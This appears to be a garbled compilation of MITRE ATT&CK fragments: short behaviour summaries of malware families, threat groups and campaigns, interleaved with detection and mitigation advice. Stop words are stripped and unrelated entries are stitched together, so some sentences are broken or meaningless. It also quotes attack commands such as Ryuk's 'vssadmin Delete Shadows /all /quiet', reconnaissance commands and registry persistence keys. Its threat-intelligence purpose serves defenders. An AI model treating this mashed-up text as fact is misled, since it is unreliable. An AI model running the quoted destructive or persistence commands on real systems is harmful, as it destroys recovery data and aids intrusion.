As response require rapid engagement 3rd parties, analyze risk critical resources Network DoS attacks create disaster recovery plan/business continuity plan respond incidents.(Citation: CERT-EU DDoS March 2017) [Umbreon](https://attack.mitre.org/software/S0221) access standard facilities SSH additional access backdoor Espeon, providing reverse receipt special packet(Citation: Umbreon Trend Micro) Prevent adversary access privileged accounts access perform technique.

Consider removing replacing components suspected compromised. version [Daserf](https://attack.mitre.org/software/S0187) MPRESS packer.(Citation: Trend Micro Daserf Nov 2017) [ccf32](https://attack.mitre.org/software/S1043) `cmd.exe` archiving data deleting files.(Citation: Bitdefender FunnyDream Campaign November 2020) Monitor DLL loads processes load user32.dll DLLs recognized loaded process. [RobbinHood](https://attack.mitre.org/software/S0400) deletes shadow copies ensure data restored easily.(Citation: CarbonBlack RobbinHood 2019)  [Andariel](https://attack.mitre.org/groups/G0138) exploited numerous ActiveX vulnerabilities, including zero-days.(Citation: FSI Andariel Campaign Rifle July 2017)(Citation: IssueMakersLab Andariel GoldenAxe 2017)(Citation: TrendMicro Andariel Tactics July 2018) (Citation: IB GrimAgent July 2021) [Remsec](https://attack.mitre.org/software/S0125) keylogger component.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Technical Analysis) [TinyTurla](https://attack.mitre.org/software/S0668) set configuration parameters Registry.(Citation: Talos TinyTurla September 2021) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `ipconfig`, `nbtstat`, `tracert`, `route print`, `cat /etc/hosts` commands.(Citation: Cybereason OperationCuckooBees 2022) [CopyKittens](https://attack.mitre.org/groups/G0052) PowerShell Empire.(Citation: ClearSky Wilted Tulip July 2017) [QakBot](https://attack.mitre.org/software/S0650) <code>net share</code> identify network shares lateral movement.(Citation: Trend Micro Qakbot 2020)(Citation: Kaspersky QakBot September 2021) infrastructure patterns malicious content utilized deliver [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) identified, internet scanning uncover adversary staged content strategic compromise.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused phases adversary lifecycle, [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) [Exploitation Client Execution](https://attack.mitre.org/techniques/T1203). [SUGARDUMP](https://attack.mitre.org/software/S1042) identify Chrome, Opera, Edge Chromium, Firefox browsers, including version number, compromised host.(Citation: Mandiant UNC3890 Aug 2022) login items created shared file lists viewable Preferences GUI <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file.(Citation: Login Items Apple)(Citation: Startup Items Eclectic)(Citation: objsee block blocking login items)(Citation: sentinelone macos persist Jun 2019) locations monitored audited. [NanoCore](https://attack.mitre.org/software/S0336)’s plugins obfuscated Eazfuscater.NET 3.3.(Citation: PaloAlto NanoCore Feb 2016) Monitor newly constructed processes command-lines abuse mechanisms evade defenses, blocking processes spawning Office documents, analysis targeting unusual/potentially malicious parent-child process relationships, spoofing PPID PowerShell/Rundll32 explorer.exe [WINERACK](https://attack.mitre.org/software/S0219) gather victim username.(Citation: FireEye APT37 Feb 2018) [LoudMiner](https://attack.mitre.org/software/S0451) obfuscated scripts encrypted DMG files.(Citation: ESET LoudMiner June 2019)	 [CHOPSTICK](https://attack.mitre.org/software/S0023) capable performing remote command execution.(Citation: Crowdstrike DNC June 2016)(Citation: ESET Sednit 2) [KARAE](https://attack.mitre.org/software/S0215) upload download files, including second-stage malware.(Citation: FireEye APT37 Feb 2018) [Winnti Windows](https://attack.mitre.org/software/S0141) HTTP/S C2 mode external proxy.(Citation: Novetta Winnti April 2015) [MoonWind](https://attack.mitre.org/software/S0149) completes network communication raw sockets.(Citation: Palo Alto MoonWind March 2017) [MacMa](https://attack.mitre.org/software/S1016) Apple’s Core Graphic APIs, `CGWindowListCreateImageFromArray`, capture user's screen windows.(Citation: ESET DazzleSpy Jan 2022)(Citation: Objective-See MacMa Nov 2021) [Gazer](https://attack.mitre.org/software/S0168) establish persistence creating .lnk file Start menu.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) Disable LLMNR NetBIOS local security settings policy environment. (Citation: ADSecurity Windows Secure Baseline) [UPPERCUT](https://attack.mitre.org/software/S0275) cmd.exe execute commands victim’s machine.(Citation: FireEye APT10 Sept 2018) [Winnti Linux](https://attack.mitre.org/software/S0430) outbound communications.(Citation: Chronicle Winnti Linux 2019) [GALLIUM](https://attack.mitre.org/groups/G0093) stolen certificates sign tools including Whizzimo LLC.(Citation: GALLIUM December 2019) [APT29](https://attack.mitre.org/groups/G0016) account credentials attempt access Managed Service Account (gMSA) passwords.(Citation: Deep Dive Solorigate January 2021) [Agent Tesla](https://attack.mitre.org/software/S0331) collect IP address victim machine spawn instances netsh.exe enumerate wireless settings.(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: SentinelLabs Agent Tesla Aug 2020)  [Confucius](https://attack.mitre.org/groups/G0142) exfiltrated victim data cloud storage service accounts.(Citation: TrendMicro Confucius APT Feb 2018) [Molerats](https://attack.mitre.org/groups/G0021) executables download malicious files sources.(Citation: Kaspersky MoleRATs April 2019)(Citation: Unit42 Molerat Mar 2020)  [SMOKEDHAM](https://attack.mitre.org/software/S0649) modified Registry hide created user accounts Windows logon screen. (Citation: FireEye SMOKEDHAM June 2021) [Bazar](https://attack.mitre.org/software/S0534) identify installed antivirus engine.(Citation: Cybereason Bazar July 2020) [AuTo Stealer](https://attack.mitre.org/software/S1029) TCP communicate command control servers.(Citation: MalwareBytes SideCopy Dec 2021) [Regin](https://attack.mitre.org/software/S0019) malware platform supports standard protocols, including HTTPS.(Citation: Kaspersky Regin) [SynAck](https://attack.mitre.org/software/S0242) gathers user names infected hosts.(Citation: SecureList SynAck Doppelgänging 2018) [Mosquito](https://attack.mitre.org/software/S0256) deletes files DeleteFileW API call.(Citation: ESET Turla Mosquito Jan 2018) [GoldMax](https://attack.mitre.org/software/S0588) check current date-time compromised system, comparing hardcoded execution trigger send current timestamp C2 server.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)  [OilRig](https://attack.mitre.org/groups/G0049) .doc file extensions mask malicious executables.(Citation: Check APT34 April 2021) [Small Sieve](https://attack.mitre.org/software/S1035) ability download files.(Citation: NCSC GCHQ Sieve Jan 2022) Develop publish policies define acceptable stored repositories. Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system. [Chimera](https://attack.mitre.org/groups/G0114) valid account maintain persistence scheduled task.(Citation: Cycraft Chimera April 2020) [LaZagne](https://attack.mitre.org/software/S0349) perform credential dumping LSA secrets account password information.(Citation: GitHub LaZagne Dec 2018) [Mustang Panda](https://attack.mitre.org/groups/G0129) created scheduled task execute additional malicious software, maintain persistence.(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: McAfee Dianxun March 2021) Monitor Registry key additions <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\</code>.
Tools Sysinternals Autoruns detect attempts persistence, including listing Active Setup Registry locations startup folders.(Citation: TechNet Autoruns) Suspicious program execution startup programs outlier processes compared historical data. [FALLCHILL](https://attack.mitre.org/software/S0181) modify file directory timestamps.(Citation: US-CERT FALLCHILL Nov 2017) [njRAT](https://attack.mitre.org/software/S0385) attempt detect victim camera initial infection. [njRAT](https://attack.mitre.org/software/S0385) detect removable drives connected system.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018) [RATANKBA](https://attack.mitre.org/software/S0241) <code>netstat -ano</code> search specific IP address ranges.(Citation: RATANKBA) (Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [Fysbis](https://attack.mitre.org/software/S0410) collect running processes.(Citation: Fysbis Dr Analysis)  Monitor Registry writes <code>HKLM\SYSTEM\ControlSet001\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\\Driver</code> <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\Driver</code> pertain print processor installations. Monitor executed commands arguments actions gather local email files. Remote access tools built-in features interact Windows API gather information. acquired Windows management tools Windows Management Instrumentation PowerShell. [ThiefQuest](https://attack.mitre.org/software/S0595) uploads files unencrypted HTTP. (Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware leverage Windows API call, CreateProcessA(), execution.(Citation: Unit 42 Gorgon Aug 2018) [APT32](https://attack.mitre.org/groups/G0050) Outlook Credential Dumper harvest credentials stored Windows registry.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [Tomiris](https://attack.mitre.org/software/S0671) establish C2 communications.(Citation: Kaspersky Tomiris Sep 2021) [FatDuke](https://attack.mitre.org/software/S0512) random intervals.(Citation: ESET Dukes October 2019) [Kasidet](https://attack.mitre.org/software/S0088) execute commands cmd.exe.(Citation: Zscaler Kasidet) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) ability modify file permissions.(Citation: ANSSI Sandworm January 2021) [FIN7](https://attack.mitre.org/groups/G0046) attempted Darkside ransomware filename sleep.exe.(Citation: CrowdStrike Carbon Spider August 2021) [NBTscan](https://attack.mitre.org/software/S0590) dump print packet content.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	 [Conficker](https://attack.mitre.org/software/S0608) current UTC victim domain generation connects time servers determine current date.(Citation: SANS Conficker)(Citation: Trend Micro Conficker) [Remsec](https://attack.mitre.org/software/S0125) process list victim.(Citation: Kaspersky ProjectSauron Technical Analysis) [POLONIUM](https://attack.mitre.org/groups/G1005) exfiltrated stolen data [POLONIUM](https://attack.mitre.org/groups/G1005)-owned OneDrive Dropbox accounts.(Citation: POLONIUM June 2022)  [CoinTicker](https://attack.mitre.org/software/S0369) downloads hidden files evade detection maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].(Citation: CoinTicker 2019) [APT39](https://attack.mitre.org/groups/G0087) post exploitation tool [CrackMapExec](https://attack.mitre.org/software/S0488) enumerate network shares.(Citation: BitDefender Chafer 2020) [Thrip](https://attack.mitre.org/groups/G0076) PsExec laterally computers victim’s network.(Citation: Symantec Thrip June 2018) Windows 10, enable Attack Surface Reduction (ASR) rules prevent [JavaScript](https://attack.mitre.org/techniques/T1059/007) scripts executing malicious downloaded content (Citation: win10_asr). [Tropic Trooper](https://attack.mitre.org/groups/G0081) encrypted traffic C2 prevent network detection.(Citation: TrendMicro Tropic Trooper 2020) [Emotet](https://attack.mitre.org/software/S0367) brute force local admin password, facilitate lateral movement.(Citation: Malwarebytes Emotet Dec 2017) [APT28](https://attack.mitre.org/groups/G0007) [Forfiles](https://attack.mitre.org/software/S0193) locate PDF, Excel, Word documents collection. searched compromised DCCC specific terms.(Citation: Überwachung APT28 Forfiles June 2015)(Citation: DOJ GRU Indictment Jul 2018) [DDKONG](https://attack.mitre.org/software/S0255) decodes embedded configuration XOR.(Citation: Rancor Unit42 June 2018) [AppleJeus](https://attack.mitre.org/software/S0584) distributed spearphishing link.(Citation: CISA AppleJeus Feb 2021) [KEYMARBLE](https://attack.mitre.org/software/S0271) command search files victim’s machine.(Citation: US-CERT KEYMARBLE Aug 2018) [Agent Tesla](https://attack.mitre.org/software/S0331) dropped RegAsm.exe systems performing malicious activity.(Citation: SentinelLabs Agent Tesla Aug 2020)  [DarkComet](https://attack.mitre.org/software/S0334) access victim’s webcam pictures.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [Threat Group-3390](https://attack.mitre.org/groups/G0027) e-mail deliver malicious attachments victims.(Citation: Trend Micro DRBControl February 2020) (Citation: Trend Micro DRBControl February 2020) [njRAT](https://attack.mitre.org/software/S0385) access victim's webcam.(Citation: Fidelis njRAT June 2013)(Citation: Citizen Lab Group5) [Carberp](https://attack.mitre.org/software/S0484) exfiltrated data established C2 servers.(Citation: Prevx Carberp March 2011)(Citation: Trusteer Carberp October 2010) [VERMIN](https://attack.mitre.org/software/S0257) delete files victim’s machine.(Citation: Unit 42 VERMIN Jan 2018) (Citation: Dragos Crashoverride 2018) [OSInfo](https://attack.mitre.org/software/S0165) enumerates local domain users(Citation: Symantec Buckeye) [Skidmap](https://attack.mitre.org/software/S0468) created fake <code>rm</code> binary replace legitimate Linux binary.(Citation: Trend Micro Skidmap) [Astaroth](https://attack.mitre.org/software/S0373) LoadLibraryExW() function load additional modules. (Citation: Cybereason Astaroth Feb 2019) adjusting read write permissions NTFS EA, tested ensure routine OS operations impeded. (Citation: InsiderThreat NTFS EA Oct 2017) [Rocke](https://attack.mitre.org/groups/G0106) scripts killed processes firewall rules block traffic cryptominers.(Citation: Talos Rocke August 2018)	 [China Chopper](https://attack.mitre.org/software/S0020)'s server component download remote files.(Citation: FireEye Periscope March 2018)(Citation: Lee 2013)(Citation: NCSC Joint Report Public Tools) [HotCroissant](https://attack.mitre.org/software/S0431) compressed network communications encrypted custom stream cipher.(Citation: Carbon Black HotCroissant April 2020)(Citation: US-CERT HOTCROISSANT February 2020) [Dok](https://attack.mitre.org/software/S0281) packed UPX executable packer.(Citation: hexed osx.dok analysis 2019) [GuLoader](https://attack.mitre.org/software/S0561) ability inject shellcode donor processes started suspended state. [GuLoader](https://attack.mitre.org/software/S0561) RegAsm donor process.(Citation: Medium Eli Salem GuLoader April 2021) [QakBot](https://attack.mitre.org/software/S0650) process hollowing execute main payload.(Citation: ATT QakBot April 2021) [XCSSET](https://attack.mitre.org/software/S0658) downloads browser specific AppleScript modules constructed URL <code>curl</code> command, <code>https://" & domain & "/agent/scripts/" & moduleName & ".applescript</code>.(Citation: trendmicro xcsset xcode project 2020) [FunnyDream](https://attack.mitre.org/software/S1044) objects identified `CLSID_ShellLink`(`IShellLink` `IPersistFile`) `WScript.Shell`(`RegWrite` method) enable persistence mechanisms.(Citation: Bitdefender FunnyDream Campaign November 2020) [Ramsay](https://attack.mitre.org/software/S0458) C2.(Citation: Antiy CERT Ramsay April 2020) [Grandoreiro](https://attack.mitre.org/software/S0531) utilize services including Google sites send receive C2 data.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [MiniDuke](https://attack.mitre.org/software/S0051) gather hostname compromised machine.(Citation: ESET Dukes October 2019) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors `time` command retrieve current time compromised system.(Citation: FoxIT Wocao December 2019) [KEYMARBLE](https://attack.mitre.org/software/S0271) upload files victim’s machine download additional payloads.(Citation: US-CERT KEYMARBLE Aug 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors uncommon ports backdoor C2, including ports 25667 470000.(Citation: FoxIT Wocao December 2019) [BONDUPDATER](https://attack.mitre.org/software/S0360) read batch commands file C2 server execute cmd.exe.(Citation: Palo Alto OilRig Sep 2018) [SMOKEDHAM](https://attack.mitre.org/software/S0649) encoded C2 traffic Base64.(Citation: FireEye SMOKEDHAM June 2021) [Cobalt Group](https://attack.mitre.org/groups/G0080) JavaScript backdoor capable collecting list security solutions installed victim's machine.(Citation: Morphisec Cobalt Gang Oct 2018) [AdFind](https://attack.mitre.org/software/S0552) gather organizational units (OUs) domain trusts Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk Trickbot January 2019)(Citation: Symantec Bumblebee June 2022) [Denis](https://attack.mitre.org/software/S0354) queries Registry values.(Citation: Cybereason Cobalt Kitty 2017) [ComRAT](https://attack.mitre.org/software/S0126) check victim's default browser determine process inject communications module into.(Citation: ESET ComRAT 2020) [FIN6](https://attack.mitre.org/groups/G0037) malicious JavaScript steal payment card data e-commerce sites.(Citation: Trend Micro FIN6 October 2019) [ZLib](https://attack.mitre.org/software/S0086) ability enumerate information.(Citation: Cylance Dust Storm) [BadPatch](https://attack.mitre.org/software/S0337) SMTP C2.(Citation: Unit 42 BadPatch Oct 2017) (Citation: Unit 42 OopsIE! Feb 2018) Monitor executed commands arguments abuse Unix commands scripts execution. Unix usage common administrator, developer, power user systems, depending job function. scripting restricted normal users, attempt enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. (Citation: Lookout Dark Caracal Jan 2018) [PowerSploit](https://attack.mitre.org/software/S0194) collection Privesc-PowerUp modules query Registry potential opportunities.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Transparent Tribe](https://attack.mitre.org/groups/G0134) crafted VBS-based malicious documents.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)	  [Gorgon Group](https://attack.mitre.org/groups/G0078) malware create .lnk file add Registry key establish persistence.(Citation: Unit 42 Gorgon Aug 2018) [PowerSploit](https://attack.mitre.org/software/S0194) collection Exfiltration modules access data local files, volumes, processes.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) Monitor newly executed processes binaries involved data destruction activity, SDelete. [SharpStage](https://attack.mitre.org/software/S0546) execute arbitrary commands command line.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) (Citation: Unit 42 MuddyWater Nov 2017)(Citation: FireEye MuddyWater Mar 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater June 2019) Monitor <code>HKLM\SOFTWARE\Microsoft\Netsh</code> registry key suspicious entries correlate files benign software. (Citation: Demaske Netsh Persistence) implementations [CHOPSTICK](https://attack.mitre.org/software/S0023) communicate C2 SMTP POP3.(Citation: ESET Sednit 2) [Mongall](https://attack.mitre.org/software/S1026) identify removable media attached compromised hosts.(Citation: SentinelOne Aoqin Dragon June 2022)
 [Bankshot](https://attack.mitre.org/software/S0239) leverages zero-day vulnerability Adobe Flash execute implant victims’ machines.(Citation: McAfee Bankshot) [Misdat](https://attack.mitre.org/software/S0083) uploaded files data C2 servers.(Citation: Cylance Dust Storm) [Orz](https://attack.mitre.org/software/S0229) overwrite Registry settings reduce visibility victim.(Citation: Proofpoint Leviathan Oct 2017) (Citation: Actinium February 2022) [SHOTPUT](https://attack.mitre.org/software/S0063) obscured XOR encoding appended valid GIF file.(Citation: FireEye Clandestine Wolf)(Citation: Palo Alto CVE-2015-3113 July 2015) [Cobalt Strike](https://attack.mitre.org/software/S0154) process hollowing execution.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Cobalt Strike Manual 4.3 November 2020) [Diavol](https://attack.mitre.org/software/S0659) `CreateToolhelp32Snapshot`, `Process32First`, `Process32Next` API calls enumerate running processes system.(Citation: Fortinet Diavol July 2021) (Citation: MSTIC Nobelium Toolset 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors collected files data compromised systems.(Citation: McAfee Night Dragon) [Pay2Key](https://attack.mitre.org/software/S0556) remove log file disk.(Citation: Check Pay2Key November 2020) [PoshC2](https://attack.mitre.org/software/S0378) enumerate service service permission information.(Citation: GitHub PoshC2) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Turla](https://attack.mitre.org/groups/G0010) exploited vulnerabilities VBoxDrv.sys driver kernel mode privileges.(Citation: Unit42 AcidBox June 2020) [CARROTBAT](https://attack.mitre.org/software/S0462) ability execute command arguments compromised host.(Citation: Unit 42 CARROTBAT January 2020) (Citation: FireEye admin@338) [Ryuk](https://attack.mitre.org/software/S0446) <code>vssadmin Delete Shadows /all /quiet</code> delete volume shadow copies <code>vssadmin resize shadowstorage</code> force deletion shadow copies created third-party applications.(Citation: CrowdStrike Ryuk January 2019) [DanBot](https://attack.mitre.org/software/S1014) VNC remote access targeted systems.(Citation: ClearSky Siamesekitten August 2021) [MuddyWater](https://attack.mitre.org/groups/G0069) malware capability execute malicious code COM, DCOM, Outlook.(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Milan](https://attack.mitre.org/software/S1015) `C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2>&1` discover network settings.(Citation: ClearSky Siamesekitten August 2021) Monitor file creation files transferred network [FIN8](https://attack.mitre.org/groups/G0061) RDP lateral movement.(Citation: FireEye Enemy FIN8 Aug 2016) [iKitten](https://attack.mitre.org/software/S0278) prompts user credentials.(Citation: objsee mac malware 2017) [Leviathan](https://attack.mitre.org/groups/G0065) publicly tools dump password hashes, including ProcDump WCE.(Citation: FireEye APT40 March 2019) [WellMail](https://attack.mitre.org/software/S0515) observed TCP port 25, SMTP, leverage port secure command control communications.(Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020) [JPIN](https://attack.mitre.org/software/S0201)'s installer/uninstaller component deletes encounters version Windows earlier Windows XP identifies security-related processes running.(Citation: PLATINUM April 2016) [REvil](https://attack.mitre.org/software/S0496) capability destroy files folders.(Citation: Kaspersky Sodin July 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Picus Sodinokibi January 2020)(Citation: Secureworks REvil September 2019) Monitor executed commands arguments actions leverage computer’s peripheral devices microphones webcams) applications voice video services) capture audio recordings purpose listening sensitive conversations gather information. [XAgentOSX](https://attack.mitre.org/software/S0161) getInfoOSX function return OS version current user.(Citation: XAgentOSX 2017) Monitor windows registry values establish persistence elevate privileges executing malicious content triggered application shims. [LockerGoga](https://attack.mitre.org/software/S0372) encrypted files, including core Windows OS files, RSA-OAEP MGF1 demanded Bitcoin paid decryption key.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)(Citation: Wired Lockergoga 2019) [Rocke](https://attack.mitre.org/groups/G0106) scripts commands persistence execute cryptocurrency mining malware.(Citation: Talos Rocke August 2018)	 Commands <code>net view</code> [Net](https://attack.mitre.org/software/S0039) gather remote systems.(Citation: Savill 1999) Internet scanners patterns malicious content designed collect host visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)
Much activity occurrence false positive rate, visibility target organization, detection difficult defenders. Detection efforts focused stages adversary lifecycle, Initial Access. [Kimsuky](https://attack.mitre.org/groups/G0094) internal spearphishing emails lateral movement stealing victim information.(Citation: KISA Operation Muzabi) [Expand](https://attack.mitre.org/software/S0361) decompress local remote CAB file executable.(Citation: Expand Utility) [Dark Caracal](https://attack.mitre.org/groups/G0070) UPX pack [Bandook](https://attack.mitre.org/software/S0234).(Citation: Lookout Dark Caracal Jan 2018) [SharpStage](https://attack.mitre.org/software/S0546) persistence component write scheduled task payload.(Citation: Cybereason Molerats Dec 2020)  [SodaMaster](https://attack.mitre.org/software/S0627) "stackstrings" obfuscation.(Citation: Securelist APT10 March 2021) [Carberp](https://attack.mitre.org/software/S0484) download execute plugins C2 server. (Citation: Prevx Carberp March 2011)(Citation: Trusteer Carberp October 2010) [Magic Hound](https://attack.mitre.org/groups/G0059) compromised personal email accounts legitimate credentials gathered additional victim information.(Citation: IBM ITG18 2020) [APT41](https://attack.mitre.org/groups/G0096) leveraged code-signing certificates sign malware targeting gaming non-gaming organizations.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [Unknown Logger](https://attack.mitre.org/software/S0130) capable downloading remote files.(Citation: Forcepoint Monsoon) [Crimson](https://attack.mitre.org/software/S0115) add Registry persistence.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) [HOPLIGHT](https://attack.mitre.org/software/S0376) multiple proxy options mask traffic malware remote operators.(Citation: US-CERT HOPLIGHT Apr 2019)	
 [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) open-source tools [Mimikatz](https://attack.mitre.org/software/S0002), [gsecdump](https://attack.mitre.org/software/S0008), [Windows Credential Editor](https://attack.mitre.org/software/S0005).(Citation: Symantec Tick Apr 2016) [Pupy](https://attack.mitre.org/software/S0192) bypass Windows UAC DLL hijacking, eventvwr, appPaths.(Citation: GitHub Pupy) [FELIXROOT](https://attack.mitre.org/software/S0267) deletes Registry key <code>HKCU\Software\Classes\Applications\rundll32.exe\shell\open</code>.(Citation: FireEye FELIXROOT July 2018) [TeamTNT](https://attack.mitre.org/groups/G0139) disabled <code>iptables</code>.(Citation: Aqua TeamTNT August 2020) [WINDSHIELD](https://attack.mitre.org/software/S0155) gather victim user name.(Citation: FireEye APT32 2017) [SpeakUp](https://attack.mitre.org/software/S0374) perform brute forcing pre-defined list usernames passwords attempt log administrative panels. (Citation: CheckPoint SpeakUp Feb 2019) [APT19](https://attack.mitre.org/groups/G0073) malware variant Port 22 malware variant collect MAC address IP address victim’s machine.(Citation: Unit 42 C0d0so0 Jan 2016) [Rocke](https://attack.mitre.org/groups/G0106) uname -m collect infected system's kernel.(Citation: Anomali Rocke March 2019) [Lucifer](https://attack.mitre.org/software/S0532) download execute replica [certutil](https://attack.mitre.org/software/S0160).(Citation: Unit 42 Lucifer June 2020) [POLONIUM](https://attack.mitre.org/groups/G1005) OneDrive DropBox C2.(Citation: POLONIUM June 2022) [KONNI](https://attack.mitre.org/software/S0356) parent PID spoofing spawn `cmd` process `CreateProcessW` handle `Taskmgr.exe`.(Citation: Malwarebytes Konni Aug 2021)  [Emotet](https://attack.mitre.org/software/S0367) observed adding downloaded payload <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> key maintain persistence.(Citation: Symantec Emotet Jul 2018)(Citation: US-CERT Emotet Jul 2018)(Citation: Picus Emotet Dec 2018) [Empire](https://attack.mitre.org/software/S0363) modules search files passwords.(Citation: Github PowerShell Empire) [Mis-Type](https://attack.mitre.org/software/S0084) created registry persistence, including `HKCU\Software\bkfouerioyou`, `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}`, `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}`.(Citation: Cylance Dust Storm) Monitor newly constructed network connections received abnormal untrusted hosts.  [Sandworm Team](https://attack.mitre.org/groups/G0034) stolen credentials access administrative accounts domain.(Citation: District Court Indictment GRU Unit 74455 October 2020) (Citation: Mandiant APT1) [Axiom](https://attack.mitre.org/groups/G0001) compromised machines proxy nodes.(Citation: Novetta-Axiom) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [ZLib](https://attack.mitre.org/software/S0086) backdoor compresses communications standard Zlib compression library.(Citation: Cylance Dust Storm) [NotPetya](https://attack.mitre.org/software/S0368) creates task reboot hour infection.(Citation: Talos Nyetya June 2017) (Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) [XTunnel](https://attack.mitre.org/software/S0117) execute remote commands.(Citation: Crowdstrike DNC June 2016) [Derusbi](https://attack.mitre.org/software/S0021) capable creating remote Bash executing commands.(Citation: Fidelis Turbo)(Citation: FireEye Periscope March 2018) [Sidewinder](https://attack.mitre.org/groups/G0121) JavaScript drop execute malware loaders.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder COVID-19 June 2020) [LookBack](https://attack.mitre.org/software/S0582) executes <code>cmd.exe</code> command.(Citation: Proofpoint LookBack Malware Aug 2019) impact forged SAML token, rotate token-signing FS certificate rapid succession twice, invalidate tokens generated previous certificate.(Citation: Mandiant Defend UNC2452 White Paper) Limit access root account prevent users modifying PAM components proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) limiting Privilege Escalation opportunities. persistence mechanism [CozyCar](https://attack.mitre.org/software/S0046) set executed startup adding Registry Registry keys: <br><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code> <br><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\</code> <br><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> <br><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>(Citation: F-Secure CozyDuke) [SMOKEDHAM](https://attack.mitre.org/software/S0649) created user accounts local Admin groups.(Citation: FireEye SMOKEDHAM June 2021) [QakBot](https://attack.mitre.org/software/S0650) inject module inject Java Script banking visited victim.(Citation: Kaspersky QakBot September 2021) [Squirrelwaffle](https://attack.mitre.org/software/S1030) executed `regsvr32.exe`.(Citation: ZScaler Squirrelwaffle Sep 2021) [Pupy](https://attack.mitre.org/software/S0192) module loading executing PowerShell scripts.(Citation: GitHub Pupy) [SeaDuke](https://attack.mitre.org/software/S0053) samples module extract email Exchange servers compromised credentials.(Citation: Symantec Seaduke 2015) [FinFisher](https://attack.mitre.org/software/S0182) variant DLL search hijacking.(Citation: FinFisher Citation)(Citation: Securelist BlackOasis Oct 2017) [LoJax](https://attack.mitre.org/software/S0397) loaded embedded NTFS DXE driver access write NTFS partitions.(Citation: ESET LoJax Sept 2018) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) XMRIG payloads persistent Windows Service.(Citation: RedCanary Mockingbird 2020) Policy configure block additions/modifications W32Time DLLs. (Citation: W32Time 2017) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [SslMM](https://attack.mitre.org/software/S0058) hard-coded primary backup C2 string.(Citation: Baumgartner Naikon 2015) [Crimson](https://attack.mitre.org/software/S0115) custom TCP protocol C2.(Citation: Proofpoint Operation Transparent Tribe March 2016) [Koadic](https://attack.mitre.org/software/S0250) identify logged users domain views user sessions.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) monitoring anomalous domain registrant domain resolution compromise domain. Efforts tailored 